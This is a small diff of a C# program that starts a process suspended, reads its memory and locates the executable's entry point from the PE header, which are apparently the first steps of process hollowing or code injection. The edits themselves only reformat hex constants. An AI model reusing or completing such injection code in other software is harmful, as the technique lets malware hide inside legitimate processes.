@@ -9,7 +9,7 @@ namespace Craft
     public class Program
     {
         public const uint CREATE_SUSPENDED = 0x4;
-        public const int PROCESSBASICINFORMATION = 0;
+        public const int PROCESSBASICINFORMATION = 0x0;
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
         public struct ProcessInfo
@@ -96,7 +96,7 @@ namespace Craft
             IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
             result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
 
-            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
+            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3C);
             uint rvaOffset = e_lfanew + 0x28;
             uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
 
